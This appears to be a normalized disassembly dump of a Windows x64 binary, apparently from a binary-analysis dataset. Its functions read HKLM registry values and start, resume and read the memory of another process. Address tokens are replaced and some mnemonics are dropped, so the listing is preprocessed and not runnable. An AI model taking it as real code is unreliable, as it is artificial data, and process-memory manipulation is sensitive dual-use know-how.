test al al
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
mov [ rsp + 0x40 ] esi
lea rax [ rbp - 0x68 ]
mov [ rbp - 0x30 ] rax
lea rax [ rsp + 0x48 ]
mov [ rbp - 0x40 ] rax
mov [ rbp - 0x50 ] 0xf
mov [ rbp - 0x58 ] rsi
mov [ rbp - 0x68 ] sil
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp ]
lea rcx [ rbp - 0x68 ]
call sub_140005c90
nop
mov [ rsp + 0x60 ] 0xf
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x48 ] sil
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp + 0x10 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x10 ]
lea rcx [ rsp + 0x48 ]
call sub_140005c90
nop
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] rsi
mov [ rsp + 0x70 ] si
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp - 0x28 ]
lea rcx [ rsp + 0x70 ]
call sub_140001dd0
nop
lea r9 [ rsp + 0x40 ]
lea r8 [ rbp - 0x68 ]
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x70 ]
call sub_140023010
movzx ebx al
lea rax [ r--data ]
lea rdi [ r--data ]
test bl bl
cmovne rdi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ac10
test bl bl
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x20 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x130 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x28 ]
call j_sub_14003ad04
cmp [ rbp - 0x10 ] 0x8
jb r-xdata
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] rsi
mov [ rsp + 0x70 ] si
lea r8d [ rsi + 0xc ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
call sub_140001ea0
mov [ rsp + 0x30 ] esi
mov [ rsp + 0x28 ] 0xb
lea rax [ rbp ]
mov [ rsp + 0x20 ] rax
lea r9d [ rsi + 0xb ]
lea r8 [ rbp + 0x10 ]
lea rdx [ rsp + 0x70 ]
mov ecx [ rsp + 0x40 ]
call sub_140007c60
jmp r-xdata
sub_1400223f0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xe0
mov [ rbp - 0x69 ] 0xfffffffffffffffe
mov [ rsp + 0x130 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1f ] rax
mov r14 rdx
mov rsi rcx
mov [ rbp - 0x61 ] rcx
xor r13b r13b
mov [ rbp - 0x41 ] 0x7
xor r15d r15d
mov [ rbp - 0x49 ] r15
mov [ rbp - 0x59 ] r15w
xor r8d r8d
lea edx [ r15 + 0x11 ]
lea rcx [ rbp - 0x59 ]
call sub_1400025a0
lea rdx [ rbp - 0x59 ]
cmp [ rbp - 0x41 ] 0x8
cmovae rdx [ rbp - 0x59 ]
mov rax [ r--data ]
mov [ rdx ] rax
mov rax [ r--data ]
mov [ rdx + 0x8 ] rax
mov rax [ r--data ]
mov [ rdx + 0x10 ] rax
mov rax [ r--data ]
mov [ rdx + 0x18 ] rax
movzx eax [ r--data ]
mov [ rdx + 0x20 ] ax
mov [ rbp - 0x49 ] 0x11
lea rax [ rbp - 0x59 ]
cmp [ rbp - 0x41 ] 0x8
cmovae rax [ rbp - 0x59 ]
mov [ rax + 0x22 ] r15w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
lea rcx [ rbp - 0x59 ]
call sub_140007240
lea r8d [ r15 + 0x6 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x59 ]
call sub_14000bb30
lea rdx [ rbp - 0x59 ]
cmp [ rbp - 0x41 ] 0x8
cmovae rdx [ rbp - 0x59 ]
lea rax [ rbp - 0x79 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x20019
xor r8d r8d
mov rcx 0xffffffff80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov r8d eax
xor edx edx
lea rcx [ rbp - 0x9 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
lea rdx [ rbp - 0x59 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x38 ] r15d
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x30 ]
xor r8d r8d
lea rdx [ r--data ]
mov rcx [ rbp - 0x79 ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
cmp [ rbp - 0x41 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
nop
mov r8d eax
xor edx edx
lea rcx [ rbp - 0x9 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
xor edx edx
call sub_140023170
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
cmp [ rsp + 0x30 ] 0x1
jne r-xdata
mov [ rbp - 0x41 ] 0x7
mov [ rbp - 0x49 ] r15
mov [ rbp - 0x59 ] r15w
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x59 ]
call j_sub_14003ad04
mov rcx [ rbp - 0x79 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
xor edx edx
call sub_140023170
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
call sub_140007970
jmp r-xdata
mov ecx [ rsp + 0x38 ]
call j_sub_14003ac60
mov r12 rax
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r12
lea r9 [ rsp + 0x30 ]
xor r8d r8d
lea rdx [ r--data ]
mov rcx [ rbp - 0x79 ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r15
mov [ rsi ] r15w
movzx eax r13b
mov rcx [ rbp + 0x1f ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x130 ]
add rsp 0xe0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsi ]
call j_sub_14003ad04
mov r8d eax
xor edx edx
lea rcx [ rbp - 0x9 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
mov rdx r12
call sub_140023170
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
mov [ rbp - 0x19 ] 0x7
mov [ rbp - 0x21 ] r15
mov [ rbp - 0x31 ] r15w
xor r8d r8d
lea edx [ rax + 0x23 ]
lea rcx [ rbp - 0x31 ]
call sub_1400025a0
lea rdx [ rbp - 0x31 ]
cmp [ rbp - 0x19 ] 0x8
cmovae rdx [ rbp - 0x31 ]
mov rax [ r--data ]
mov [ rdx ] rax
mov rax [ r--data ]
mov [ rdx + 0x8 ] rax
mov rax [ r--data ]
mov [ rdx + 0x10 ] rax
mov rax [ r--data ]
mov [ rdx + 0x18 ] rax
mov rax [ r--data ]
mov [ rdx + 0x20 ] rax
mov rax [ r--data ]
mov [ rdx + 0x28 ] rax
mov rax [ r--data ]
mov [ rdx + 0x30 ] rax
mov rax [ r--data ]
mov [ rdx + 0x38 ] rax
mov eax [ r--data ]
mov [ rdx + 0x40 ] eax
movzx eax [ r--data ]
mov [ rdx + 0x44 ] ax
mov [ rbp - 0x21 ] 0x23
lea rax [ rbp - 0x31 ]
cmp [ rbp - 0x19 ] 0x8
cmovae rax [ rbp - 0x31 ]
mov [ rax + 0x46 ] r15w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
lea rcx [ rbp - 0x31 ]
call sub_14000bb30
lea r8d [ r15 + 0xe ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x31 ]
call sub_14000bb30
lea rdx [ rbp - 0x31 ]
cmp [ rbp - 0x19 ] 0x8
cmovae rdx [ rbp - 0x31 ]
lea rax [ rbp - 0x71 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x20019
xor r8d r8d
mov rcx 0xffffffff80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov rcx r12
call j_sub_14003ad04#2
jmp r-xdata
mov rcx [ rbp - 0x9 ]
mov r8d eax
xor edx edx
lea rcx [ rbp - 0x9 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
lea rdx [ rbp - 0x31 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
mov [ rbp - 0x7d ] r15d
mov [ rsp + 0x34 ] r15d
lea rax [ rsp + 0x34 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r15
lea r9 [ rbp - 0x7d ]
xor r8d r8d
lea rdx [ r--data ]
mov rcx [ rbp - 0x71 ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
cmp [ rbp - 0x19 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
nop
mov r8d eax
xor edx edx
lea rcx [ rbp - 0x9 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
xor edx edx
call sub_140023170
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
cmp [ rbp - 0x7d ] 0x1
jne r-xdata
mov rcx [ rbp - 0x31 ]
jmp r-xdata
mov rcx [ rbp - 0x71 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
xor edx edx
call sub_140023170
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
call sub_140007970
jmp r-xdata
mov ecx [ rsp + 0x34 ]
call j_sub_14003ac60
mov rbx rax
lea rax [ rsp + 0x34 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rbx
lea r9 [ rbp - 0x7d ]
xor r8d r8d
lea rdx [ r--data ]
mov rcx [ rbp - 0x71 ]
call [ RegQueryValueExW@IAT ]
test eax eax
sete r13b
test r13b r13b
je r-xdata
call j_sub_14003ad04
mov r8d eax
xor edx edx
lea rcx [ rbp - 0x9 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
mov rdx rbx
call sub_140023170
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rbx
mov rcx r14
call sub_140001ea0
jmp r-xdata
mov rcx rbx
call j_sub_14003ad04#2
jmp r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
sub_140022ac0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xa0
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rsp + 0xf0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
mov [ rsp + 0x48 ] r9
mov [ rsp + 0x38 ] r8
mov rbp rdx
mov r13 rcx
mov [ rsp + 0x50 ] rcx
mov [ rsp + 0x60 ] rcx
mov rsi [ rsp + 0x100 ]
mov [ rsp + 0x30 ] rsi
xor r12b r12b
mov ecx 0x18
call sub_14003ac60
mov rdi rax
xor r14d r14d
test rax rax
je r-xdata
mov rdi r14
xor eax eax
mov [ rdi ] rax
mov [ rdi + 0x8 ] rax
mov [ rdi + 0x10 ] rax
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x68 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x80 ] 0x8
jb r-xdata
mov ecx 0x240
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
xor r9d r9d
mov r8b 0x1
mov rdx rdi
mov rcx r13
call sub_14000c8c0
test al al
je r-xdata
mov rcx rdi
call j_sub_14003ad04
nop
cmp [ r13 + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
mov rbx r14
mov [ rsp + 0x40 ] rbx
xor edx edx
mov r8d 0x240
mov rcx rax
call sub_14003d760
jmp r-xdata
mov [ r13 + 0x18 ] 0x7
mov [ r13 + 0x10 ] r14
mov [ r13 ] r14w
movzx eax r12b
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xf0 ]
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ r13 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x68 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x80 ] 0x8
jb r-xdata
mov r15 [ rdi ]
mov rsi [ rbx + 0x10 ]
mov rcx rbp
call j_sub_14003ac60
mov r14 rax
mov bl 0x1
xor r12b r12b
mov r13 [ rsp + 0x38 ]
mov rdx [ rdi ]
mov rcx rbx
call sub_14000caa0
test al al
je r-xdata
mov rcx [ rsp + 0x40 ]
call j_sub_14003ad04
mov rcx [ rdi + 0x8 ]
call [ ResumeThread@IAT ]
cmp eax 0xffffffff
mov r13 [ rsp + 0x50 ]
jne r-xdata
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
jmp r-xdata
mov rcx r14
call j_sub_14003ad04#2
test r12b r12b
je r-xdata
test r12b r12b
jne r-xdata
test rsi rsi
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x68 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x80 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x68 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x80 ] 0x8
jb r-xdata
mov r9 [ rdi ]
mov r8 rbp
mov rdx [ rsp + 0x48 ]
mov rcx rsi
call sub_140006890
movzx r12d al
test al al
jne r-xdata
mov r9 rbp
cmp r15 0xffffffffffffffff
jne r-xdata
or edx 0xffffffff
mov rcx [ rdi ]
call [ WaitForInputIdle@IAT ]
mov rcx [ rdi + 0x8 ]
call [ CloseHandle@IAT ]
mov rcx [ rdi ]
call [ CloseHandle@IAT ]
jmp r-xdata
mov eax [ rdi + 0x10 ]
mov [ rsi ] eax
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
xor r12b r12b
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
jmp r-xdata
mov rsi [ rsp + 0x30 ]
xor r14d r14d
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x68 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x80 ] 0x8
jb r-xdata
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rax
mov r8 r14
mov rdx rsi
mov rcx r15
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov r8 rsi
mov rdx rbp
mov rcx r14
call sub_14003b740
test eax eax
sete bl
test bl bl
je r-xdata
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
jmp r-xdata
xor bl bl
jmp r-xdata
cmp [ rsp + 0x38 ] rbp
jne r-xdata
jmp r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov r8 rbp
mov rdx r13
mov rcx r14
call sub_14003d8f0
test eax eax
sete r12b
test r12b r12b
jne r-xdata
inc rsi
jmp r-xdata
sub_140022eb0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x80
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov rbx r8
mov rdi rdx
mov rsi rcx
mov [ rsp + 0x70 ] rcx
mov [ rsp + 0x60 ] rdx
mov [ rsp + 0x68 ] rbx
xor bpl bpl
mov rax [ rdx + 0x10 ]
xor r14d r14d
cmp rax [ r8 + 0x10 ]
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
lea r13 [ rax + rax + 0x2 ]
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r14
mov [ rsi ] r14w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsi ]
call j_sub_14003ad04
mov r12 rdx
mov r12 [ rdx ]
jmp r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r14
mov [ rdi ] r14w
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov rbp rbx
mov rbp [ r8 ]
jmp r-xdata
cmp [ r8 + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
movzx eax bpl
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x80
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x48 ] 0x7
mov [ rsp + 0x40 ] r14
mov [ rsp + 0x30 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rcx
lea rcx [ rsp + 0x30 ]
call sub_140001dd0
mov [ rsp + 0x20 ] r14
mov r9 rbp
mov r8 r12
mov rdx r13
lea rcx [ rsp + 0x30 ]
call sub_140022ac0
movzx ebp al
jmp r-xdata
sub_140023010
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov r14 r9
mov rbx r8
mov rdi rdx
mov rsi rcx
mov [ rsp + 0x70 ] rcx
mov [ rsp + 0x60 ] rdx
mov [ rsp + 0x68 ] rbx
xor bpl bpl
mov rax [ rdx + 0x10 ]
xor r15d r15d
cmp rax [ r8 + 0x10 ]
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
lea r13 [ rax + 0x1 ]
cmp [ rdx + 0x18 ] 0x10
jb r-xdata
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r15
mov [ rsi ] r15w
cmp [ rdi + 0x18 ] 0x10
jb r-xdata
mov rcx [ rsi ]
call j_sub_14003ad04
mov r12 rdx
mov r12 [ rdx ]
jmp r-xdata
mov [ rdi + 0x18 ] 0xf
mov [ rdi + 0x10 ] r15
mov [ rdi ] 0x0
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov rbp rbx
mov rbp [ r8 ]
jmp r-xdata
cmp [ r8 + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] r15
mov [ rbx ] 0x0
movzx eax bpl
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x48 ] 0x7
mov [ rsp + 0x40 ] r15
mov [ rsp + 0x30 ] r15w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rcx
lea rcx [ rsp + 0x30 ]
call sub_140001dd0
mov [ rsp + 0x20 ] r14
mov r9 rbp
mov r8 r12
mov rdx r13
lea rcx [ rsp + 0x30 ]
call sub_140022ac0
movzx ebp al
jmp r-xdata
sub_140023170
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14 rdx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_140003240
nop
mov rcx rax
call sub_14000b0c0
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_1400103c0
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x20 ] ax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x8 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_140023350
mov rax rsp
push rbp
lea rbp [ rax - 0x378 ]
sub rsp 0x470
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x360 ] rax
mov rbx rcx
mov [ rsp + 0x28 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_140024270 ]
mov [ rbp + 0x300 ] rax
mov esi 0x7
mov [ rbp + 0x320 ] rsi
mov [ rbp + 0x308 ] di
mov rcx [ r--data ]
mov [ rbp + 0x308 ] rcx
mov [ rbp + 0x318 ] 0x4
lea rax [ rbp + 0x308 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0x8 ] di
mov [ rbp + 0x348 ] rsi
mov [ rbp + 0x340 ] rdi
mov [ rbp + 0x330 ] di
xor r8d r8d
lea edx [ rdi + 0x14 ]
lea rcx [ rbp + 0x330 ]
call sub_1400025a0
lea r11 [ rbp + 0x330 ]
cmp [ rbp + 0x348 ] 0x8
cmovae r11 [ rbp + 0x330 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov [ rbp + 0x340 ] 0x14
lea rax [ rbp + 0x330 ]
cmp [ rbp + 0x348 ] 0x8
cmovae rax [ rbp + 0x330 ]
mov [ rax + 0x28 ] di
lea rdx [ rbp + 0x300 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140023d60 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x58 ] di
mov rcx [ r--data ]
mov [ rbp - 0x58 ] rcx
mov eax [ r--data ]
mov [ rbp - 0x50 ] eax
mov [ rbp - 0x48 ] 0x6
lea rax [ rbp - 0x58 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xc ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x21 ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea r11 [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae r11 [ rbp - 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov rax [ r--data ]
mov [ r11 + 0x38 ] rax
movzx eax [ r--data ]
mov [ r11 + 0x40 ] ax
mov [ rbp - 0x20 ] 0x21
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x42 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140023d80 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x48 ] di
mov rcx [ r--data ]
mov [ rsp + 0x48 ] rcx
mov eax [ r--data ]
mov [ rsp + 0x50 ] eax
mov [ rsp + 0x58 ] 0x6
lea rax [ rsp + 0x48 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xc ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x21 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea r11 [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae r11 [ rsp + 0x70 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
